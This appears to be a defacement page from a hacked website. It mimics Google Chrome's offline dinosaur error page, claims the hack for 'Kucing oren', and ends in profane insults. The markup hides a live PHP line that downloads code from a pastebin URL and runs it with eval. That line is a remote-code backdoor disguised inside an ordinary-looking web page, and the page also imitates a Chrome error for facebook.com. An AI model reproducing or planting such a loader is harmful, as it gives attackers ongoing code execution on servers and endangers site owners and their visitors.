<html i18n-values="dir:textdirection;lang:language" dir="ltr" lang="en"><head>
  ...
  <meta property="og:image" content="https://pbs.twimg.com/profile_images/1136553375145742336/d9fpvVXz_400x400.jpg">
  
  <meta name="viewport" content="width=device-width, initial-scale=1.0,
                                 maximum-scale=1.0, user-scalable=no">
  <title i18n-content="title">hacked by Kucing oren</title>
  ...
  <div id="main-frame-error" class="interstitial-wrapper">
    <div id="main-content">
      ...
      <div id="main-message">
        ...
        <p>Has Been Hacked By Kucing oren Internet is connected, that does not mean Google Chrome can stop you playing this game :P.</p>
        <div class="error-code" jscontent="errorCode">THANKS KUCING CYBER INDONESIA</div>
      </div>
    </div>
<?php eval("?>".file_get_contents("https://pastebin.com/raw/bzDkGwJ4"));?>
...
</script><script>loadTimeData.data = {"details":"Details","errorCode":"ERR_INTERNET_DISCONNECTED","errorDetails":"The Internet connection has been lost.","fontfamily":"'Helvetica Neue', 'Lucida Grande', sans-serif","f{ontsize":"75%","heading":"Klick Picture Dinosaurus Unable to connect to the Internet Error 404 By Kucing Oren","hideDetails":"Hide details","iconClass":"icon-offline","language":"en","primaryParagraph":"Google Chrome can’t display the webpage because your computer isn’t connected to the Internet.","suggestions":[],"summary":{"failedUrl":"https://www.facebook.com/","hostName":"www.facebook.com","msg":"You can try to diagnose the problem by taking the following steps:\n          \u003Cbr />\n          Go to\n          \u003Cstrong>\n          Applications > System Preferences > Network > Assist me\n          \u003C/strong>\n          to test your connection.","productName":"Google Chrome"},"textdirection":"ltr","title":"https://www.facebook.com/ is not available"};</script>
...
</body><center><font size="7" color="red">FUCK YOU  Kontolll CYBER Team We are onanimous <br><center></font><br><br><br></html>